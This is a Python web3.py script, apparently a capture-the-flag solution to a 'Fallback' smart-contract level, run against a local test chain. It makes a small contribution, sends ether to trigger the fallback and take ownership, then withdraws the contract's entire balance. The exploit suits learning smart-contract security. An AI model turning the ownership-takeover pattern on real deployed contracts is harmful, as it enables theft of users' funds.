#The fallback contract is a contract that limits the amount of ether each address can send
# and the address with the most contribution can withdraw all the ether inside the contract
# but the contract owner/deployer starts with a thousand Ether of contribution.
# it would be a race to a thousand Ether from all players and the first one would take it all
# but the fallback function in the contract (the function that is executed when the contract
# receives ether), changes the owner of the contract, but it needs that the address sending
# the ether have done any contribution before. Below is the code in detail to "hack" the
# contract


# Using web3.py library to make it easier building and signing transactions
from web3 import Web3
from web3.middleware import construct_sign_and_send_raw_middleware

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions. This private key is from the local network
# it is public and not safe to use in a real blockchain
account = Account.from_key("") #TODO: Include operator PK
print(account.address)

# Setting up the provider. For this tests I used a local deployed blockchain
w3Provider = Web3(Web3.HTTPProvider("http://127.0.0.1:8545/"))
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(account))
w3Provider.eth.default_account = account.address

# Getting ABI data from contracts builds and creating the contract object for easier
# contract methods calls.
buildFile = open('../contracts/build/contracts/levels/Fallback.sol/Fallback.json', "r")
build = json.loads(buildFile.read())
contract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# You have to send Ether with your transaction and you have to make sure it is lower than
# the contract require "require(msg.value < 0.001 ether)". To optimize I could have go
# lower.
transaction = contract.functions.contribute().transact({'value': Web3.toWei(0.0001, "ether")})
print(w3Provider.eth.wait_for_transaction_receipt(transaction))

# Now I build the transaction to activate the fallback function, since the last transaction
# got us past the require "require(msg.value > 0 && contributions[msg.sender] > 0)" this
# should get us owner status
fallbackTransaction = {
    'to': '', #TODO: Include deployed contract address
    'value': 1,
}
transaction = w3Provider.eth.send_transaction(fallbackTransaction)
print(w3Provider.eth.wait_for_transaction_receipt(transaction))

# Finally we call the withdraw function to get all Ether.
transaction = contract.functions.withdraw().transact()
print(w3Provider.eth.wait_for_transaction_receipt(transaction))